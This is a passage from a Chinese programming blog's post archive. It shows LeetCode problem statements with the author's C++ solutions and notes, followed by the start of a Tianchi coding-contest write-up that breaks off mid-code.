    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/nGK0Fy/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>小扣在秋日市集发现了一款速算机器人。店家对机器人说出两个数字（记作 <code>x</code> 和 <code>y</code>），请小扣说出计算指令：</p>
<ul>
<li><code>&quot;A&quot;</code> 运算：使 <code>x = 2 * x + y</code>；</li>
<li><code>&quot;B&quot;</code> 运算：使 <code>y = 2 * y + x</code>。</li>
</ul>
<p>在本次游戏中，店家说出的数字为 <code>x = 1</code> 和 <code>y = 0</code>，小扣说出的计算指令记作仅由大写字母 <code>A</code>、<code>B</code> 组成的字符串 <code>s</code>，字符串中字符的顺序表示计算顺序，请返回最终 <code>x</code> 与 <code>y</code> 的和为多少。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;AB&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：</span><br><span class="line">经过一次 A 运算后，x &#x3D; 2, y &#x3D; 0。</span><br><span class="line">再经过一次 B 运算，x &#x3D; 2, y &#x3D; 2。</span><br><span class="line">最终 x 与 y 之和为 4。</span><br></pre></td></tr></table></figure>
<p><strong>提示</strong></p>
<ul>
<li><code>0 &lt;= s.length &lt;= 10</code></li>
<li><code>s</code> 由 <code>&#39;A&#39;</code> 和 <code>&#39;B&#39;</code> 组成</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>根据题目描述直接模拟，根据字符串的每个字符执行相应的运算。</p>
<p><strong>c++代码：</strong>(执行用时0ms，击败100.00%，内存消耗6.1M，击败14.72%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">calculate</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> x=<span class="number">1</span>,y=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">&#x27;A&#x27;</span>)&#123;</span><br><span class="line">                x=<span class="number">2</span>*x+y;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">&#x27;B&#x27;</span>)&#123;</span><br><span class="line">                y=<span class="number">2</span>*y+x;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x+y;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，太简单了，下一道走起😑</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>重新排列字符串</title>
    <url>/2020/11/10/%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/shuffle-string/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个字符串 <code>s</code> 和一个 长度相同 的整数数组 <code>indices</code> 。</p>
<p>请你重新排列字符串 <code>s</code> ，其中第 <code>i</code> 个字符需要移动到 <code>indices[i]</code> 指示的位置。</p>
<p>返回重新排列后的字符串。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<p><img src="/2020/11/10/%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%AD%97%E7%AC%A6%E4%B8%B2/q1.jpg" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;codeleet&quot;, indices &#x3D; [4,5,6,7,0,2,1,3]</span><br><span class="line">输出：&quot;leetcode&quot;</span><br><span class="line">解释：如图所示，&quot;codeleet&quot; 重新排列后变为 &quot;leetcode&quot; 。</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;abc&quot;, indices &#x3D; [0,1,2]</span><br><span class="line">输出：&quot;abc&quot;</span><br><span class="line">解释：重新排列后，每个字符都还留在原来的位置上。</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aiohn&quot;, indices &#x3D; [3,1,4,2,0]</span><br><span class="line">输出：&quot;nihao&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例4：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;aaiougrt&quot;, indices &#x3D; [4,0,2,6,7,3,1,5]</span><br><span class="line">输出：&quot;arigatou&quot;</span><br></pre></td></tr></table></figure>
<p><strong>示例5：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：s &#x3D; &quot;art&quot;, indices &#x3D; [1,0,2]</span><br><span class="line">输出：&quot;rat&quot;</span><br></pre></td></tr></table></figure>
<p><strong>提示：</strong></p>
<ul>
<li><p><code>s.length == indices.length == n</code></p>
</li>
<li><p><code>1 &lt;= n &lt;= 100</code></p>
</li>
<li><p><code>s</code> 仅包含小写英文字母。</p>
</li>
<li><p><code>0 &lt;= indices[i] &lt; n</code></p>
</li>
<li><p><code>indices</code> 的所有的值都是唯一的（也就是说，<code>indices</code> 是整数 <code>0</code> 到 <code>n - 1</code> 形成的一组排列）。</p>
</li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>使用map容器，map容器存储键值对，会根据各键值对的键的大小升序排序。用indices数组中的值作为键，对应的字符作为值存到map容器中，最后用map中的值组成字符串返回。</p>
<p><strong>c++代码：</strong>(执行用时36ms，击败5.57%，内存消耗16.8M，击败5.04%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">restoreString</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">map</span>&lt;<span class="keyword">int</span>,<span class="keyword">char</span>&gt; myMap;</span><br><span class="line">        <span class="comment">//初始化map容器，会按照键值从小到大排序</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();++i)&#123;</span><br><span class="line">            myMap[indices[i]]=s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;myMap.size();++i)&#123;</span><br><span class="line">            s[i]=myMap[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎官 方 题 解💎💎💎💎💎💎💎💎💎💎💎💎💎💎💎</center>

<h6 id="官方题解"><a href="#官方题解" class="headerlink" title="官方题解:"></a><a href="https://leetcode-cn.com/problems/shuffle-string/solution/zhong-xin-pai-lie-zi-fu-chuan-by-leetcode-solution/">官方题解</a>:</h6><p><strong>方法一：模拟</strong><br><strong>思路与算法</strong></p>
<p>创建一个新字符串 $\textit{result}$ 来存储答案。对于 $s$ 每个下标 $i$，将 $\textit{result}[\textit{indices}$[i]]处的字符设成 $s[i]$即可。</p>
<p><strong>代码</strong>：（执行8ms，击败98.89%，内存15.2M，击败15.39%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">restoreString</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">result</span><span class="params">(length, <span class="number">0</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            result[indices[i]] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$为字符串 $s$ 的长度。我们只需对字符串 $s$ 执行一次线性扫描即可。</p>
</li>
<li><p>空间复杂度：$O(1)$或 $O(N)$。除开辟的存储答案的字符串外，我们只需要常数空间存放若干变量。如果使用的语言不允许对字符串进行修改，我们还需要 $O(N)$的空间临时存储答案。</p>
</li>
</ul>
<p><strong>方法二：原地修改</strong><br><strong>思路与算法</strong></p>
<p>本题也可以通过原地修改输入数据的方式来求解。</p>
<p>直观的想法是：对于下标 $i$，需要把字符 $s[i]$ 移动到 $\textit{indices}[i]$ 的位置上；然后，我们前进到位置 ，并将字符 $s[\textit{indices}[i]]$移动到 $\textit{indices}[\textit{indices}[i]]$的位置上。类似的过程以此类推，直到最终回到起点 $i$。此时，封闭路径 $i \to \textit{indices}[i] \to \textit{indices}[\textit{indices}[i]] \to … \to i$上的所有字符，都已经被设置成正确的值。</p>
<p>我们只要找到 $\textit{indices}[i]$中所有这样的封闭路径，并进行对应的移动操作，就能够得到最终的答案。</p>
<p>这样做有一个小小的问题：当在第二步试图把字符 $s[\textit{indices}[i]]$移动到 $\textit{indices}[\textit{indices}[i]]$ 的位置上时，会发现字符  已经在第一步被覆写了。因此，在每一步移动前，需要先额外记录目标位置处字符的原有值。</p>
<p>另一个隐含的问题是如何避免处理重复的封闭路径。为了解决此问题，我们每处理一个封闭路径，就将该路径上的 $\textit{indices}$数组的值设置成<strong>下标自身</strong>。这样，当某个封闭路径被处理完毕后，扫描到该路径的另一个下标时，就不会处理该封闭路径了。</p>
<p>由于许多语言中的字符串类型都是<strong>不可更改的</strong>，实现原地修改较为麻烦，因此下面只给出 <code>C++</code> 的参考代码。</p>
<p><strong>代码：</strong>（执行16ms，击败77.65%，内存15.3M，击败13.37%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">restoreString</span><span class="params">(<span class="built_in">string</span> s, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; indices)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> length = s.length();</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (indices[i] != i) &#123;</span><br><span class="line">                <span class="keyword">char</span> ch = s[i]; <span class="comment">// 当前需要被移动的字符</span></span><br><span class="line">                <span class="keyword">int</span> idx = indices[i]; <span class="comment">// 该字符需要被移动的目标位置</span></span><br><span class="line">                <span class="keyword">while</span> (idx != i) &#123;</span><br><span class="line">                    swap(s[idx], ch); <span class="comment">// 使用 swap 函数，在覆写 s[idx] 之前，先将其原始值赋给变量 ch</span></span><br><span class="line">                    swap(indices[idx], idx); <span class="comment">// 将封闭路径中的 indices 数组的值设置成下标自身</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 退出循环后，还要再覆写起点处的字符</span></span><br><span class="line">                s[i] = ch;</span><br><span class="line">                indices[i] = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><strong>复杂度分析</strong></p>
<ul>
<li><p>时间复杂度：$O(N)$，其中 $N$ 为字符串 $s$ 的长度。尽管代码看上去有两层循环，但因为不会处理相同的封闭路径，每个下标实际上只被处理了一次，故时间复杂度是线性的。</p>
</li>
<li><p>空间复杂度：$O(1)$。我们只需开辟常量大小的额外空间。</p>
</li>
</ul>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>这道题其实直接模拟是效率比较高的，其他的方法反而可能效率不是那么高，我还用到了map集合想着高端一点🤣，结果官方题解都没用map</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>重新排列数组</title>
    <url>/2020/11/07/%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/shuffle-the-array/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>给你一个数组 <code>nums</code> ，数组中有 <code>2n</code> 个元素，按 <code>[x1,x2,...,xn,y1,y2,...,yn]</code> 的格式排列。</p>
<p>请你将数组按 <code>[x1,y1,x2,y2,...,xn,yn]</code> 格式重新排列，返回重排后的数组。</p>
<a id="more"></a>
<p><strong>示例1：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [2,5,1,3,4,7], n &#x3D; 3</span><br><span class="line">输出：[2,3,5,4,1,7] </span><br><span class="line">解释：由于 x1&#x3D;2, x2&#x3D;5, x3&#x3D;1, y1&#x3D;3, y2&#x3D;4, y3&#x3D;7 ，所以答案为 [2,3,5,4,1,7]</span><br></pre></td></tr></table></figure>
<p><strong>示例2：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,2,3,4,4,3,2,1], n &#x3D; 4</span><br><span class="line">输出：[1,4,2,3,3,2,4,1]</span><br></pre></td></tr></table></figure>
<p><strong>示例3：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：nums &#x3D; [1,1,2,2], n &#x3D; 2</span><br><span class="line">输出：[1,2,1,2]</span><br></pre></td></tr></table></figure>
<p><strong>限制：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 500</code></li>
<li><code>nums.length == 2n</code></li>
<li><code>1 &lt;= nums[i] &lt;= 10^3</code></li>
</ul>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历数组nums，将按1、1+n、2、2+n…这样的顺序取出元素添加到结果中返回</p>
<p><strong>c++代码：</strong>(执行用时12ms，击败73.25%，内存消耗9.9M，击败10.07%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">shuffle</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; result;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;++i)&#123;</span><br><span class="line">            result.push_back(nums[i]);</span><br><span class="line">            result.push_back(nums[i+n]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>题目比较简单，没有官方题解，Let‘s go on😛</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>链表中倒数第k个节点</title>
    <url>/2020/11/10/%E9%93%BE%E8%A1%A8%E4%B8%AD%E5%80%92%E6%95%B0%E7%AC%ACk%E4%B8%AA%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong><a href="https://leetcode-cn.com/problems/lian-biao-zhong-dao-shu-di-kge-jie-dian-lcof/submissions/">题目地址</a></strong></p>
<p><strong>难度：</strong>⭐</p>
<h6 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h6><p>输入一个链表，输出该链表中倒数第k个节点。为了符合大多数人的习惯，本题从1开始计数，即链表的尾节点是倒数第1个节点。例如，一个链表有6个节点，从头节点开始，它们的值依次是1、2、3、4、5、6。这个链表的倒数第3个节点是值为4的节点。</p>
<a id="more"></a>
<p><strong>示例：</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">给定一个链表: 1-&gt;2-&gt;3-&gt;4-&gt;5, 和 k &#x3D; 2.</span><br><span class="line"></span><br><span class="line">返回链表 4-&gt;5.</span><br></pre></td></tr></table></figure>
<center>🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️解题过程🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️🙋‍♂️</center>

<h6 id="解题过程："><a href="#解题过程：" class="headerlink" title="解题过程："></a>解题过程：</h6><p><strong>思路：</strong></p>
<p>遍历链表，把每个结点指针存到vector容器中，返回倒数第k个节点可以直接下标获取。</p>
<p><strong>c++代码：</strong>(执行用时8ms，击败54.44%，内存消耗10.9M，击败5.06%）</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">getKthFromEnd</span><span class="params">(ListNode* head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//结点指针容器</span></span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; tmp;</span><br><span class="line">        <span class="keyword">while</span>(head)&#123;</span><br><span class="line">            tmp.push_back(head);</span><br><span class="line">            head=head-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> tmp[tmp.size()-k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<center>⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳总 结⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳⏳</center>

<h6 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h6><p>没有官方题解，也比较简单，没啥可说的。</p>
]]></content>
      <categories>
        <category>ACM</category>
        <category>LeetCode</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>简单</tag>
      </tags>
  </entry>
  <entry>
    <title>编程battle-精神小伙场</title>
    <url>/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>本次是阿里云天池平台上的在线编程battle赛，详细信息如下</p>
<p><strong>比赛地址：</strong></p>
<p><a href="https://tianchi.aliyun.com/oj/141733967030952298?spm=5176.15098393.J_6210563800.4.450a5cd646REpt">【精神小伙场】水一波礼品队</a><br><a href="https://tianchi.aliyun.com/oj/140269389066823835?spm=5176.15098393.J_6210563800.2.450a5cd646REpt">【精神小伙场】次次AC队</a></p>
<p><strong>活动规则：</strong></p>
<p>1、参赛者将与对手【次次AC队】进行较量，答出一题即可上榜，上榜人数多的一方取得胜利并瓜分【精神小伙场】所含34万积分 (可在天池兑换各种丰厚奖品）。 2、请在10月24日下午20：00-22：00期间答题，比赛结束后可以答题但不计入排行榜。 3、排行榜采用ACM赛制，总用时为罚时+答题时间总和。排行榜每2分钟更新1次，22点显示排行榜最终结果。 4、代码中请勿包含任何个人信息、账号、口令等信息，以免造成泄漏。 5、比赛答疑和交流欢迎加入钉钉群：35215271 6、积分会在5个工作日内自动发放至个人账号</p>
<p><strong>奖品设置：</strong></p>
<p>获胜一方上榜选手均分34万积分（天池粮票） 粮票兑换奖品链接：<a href="https://tianchi.aliyun.com/home/souvenir">https://tianchi.aliyun.com/home/souvenir</a></p>
<a id="more"></a>
<p><strong>参赛题目：</strong></p>
<div class="table-container">
<table>
<thead>
<tr>
<th>题目</th>
<th>难度</th>
<th>通过率</th>
<th>状态</th>
</tr>
</thead>
<tbody>
<tr>
<td>1.笛卡尔积</td>
<td>中等</td>
<td>91%</td>
<td><img src="https://img.alicdn.com/tfs/TB1TzBYNfb2gK0jSZK9XXaEgFXa-40-40.png" alt="img"></td>
</tr>
<tr>
<td>2.解码方式</td>
<td>困难</td>
<td>67%</td>
<td><img src="https://img.alicdn.com/tfs/TB1TzBYNfb2gK0jSZK9XXaEgFXa-40-40.png" alt="img"></td>
</tr>
<tr>
<td>3.数字消除</td>
<td>简单</td>
<td>28%</td>
<td><img src="https://img.alicdn.com/tfs/TB1xubla3gP7K4jSZFqXXamhVXa-40-40.png" alt="img"></td>
</tr>
<tr>
<td>4.连接两个字符串中的不同字符</td>
<td>简单</td>
<td>71%</td>
<td><img src="/2020/10/24/%E7%BC%96%E7%A8%8Bbattle-%E7%B2%BE%E7%A5%9E%E5%B0%8F%E4%BC%99%E5%9C%BA/TB1xubla3gP7K4jSZFqXXamhVXa-40-40.png" alt="img"></td>
</tr>
</tbody>
</table>
</div>
<p>我是作为“水一波礼品队”参加的，下面是本次比赛的做题过程及题解分析，仅此记录学习一下</p>
<h6 id="连接两个字符串中的不同字符"><a href="#连接两个字符串中的不同字符" class="headerlink" title="连接两个字符串中的不同字符"></a>连接两个字符串中的不同字符</h6><p><strong>题目描述：</strong></p>
<p>给出两个字符串, 你需要修改第一个字符串，将所有与第二个字符串中相同的字符删除, 并且第二个字符串中不同的字符与第一个字符串的不同字符连接</p>
<p><strong>示例：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">样例 <span class="number">1</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入 : s1 = <span class="string">&quot;aacdb&quot;</span>, s2 = <span class="string">&quot;gafd&quot;</span></span><br><span class="line">输出 : <span class="string">&quot;cbgf&quot;</span></span><br><span class="line"></span><br><span class="line">样例 <span class="number">2</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">输入 : <span class="string">&quot;abcs&quot;</span>, s2 = <span class="string">&quot;cxzca&quot;</span></span><br><span class="line">输出 : <span class="string">&quot;bsxz&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>思路：</strong>先遍历s1中的字符判断是否在s2中，如果不在就添加到最后结果中；然后同理再遍历s2</p>
<p><strong>代码：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @param s1: the 1st string</span></span><br><span class="line"><span class="comment">     * @param s2: the 2nd string</span></span><br><span class="line"><span class="comment">     * @return: uncommon characters of given strings</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="built_in">string</span> <span class="title">concatenetedString</span><span class="params">(<span class="built_in">string</span> &amp;s1, <span class="built_in">string</span> &amp;s2)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// write your code here</span></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="comment">//存储最后结果</span></span><br><span class="line">    <span class="built_in">string</span> result=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="comment">//遍历查找s1中的不在s2中的字符</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;s1.length();i++)&#123;</span><br><span class="line">        <span class="comment">//遍历查找字符串s2是否包含子串s1中的字符,其中string:npos是个特殊值，说明查找没有匹配</span></span><br><span class="line">        <span class="keyword">if</span>(s2.find(s1[i])==<span class="built_in">string</span>::npos)&#123;</span><br><span class="line">            <span class="comment">//如果s2中不含当前s1中的字符，则添加到result中</span></span><br><span class="line">            result+=s1[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//同理，找到s2中的不在s1中的字符</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;s2.length();i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s1.find(s2[i])==<span 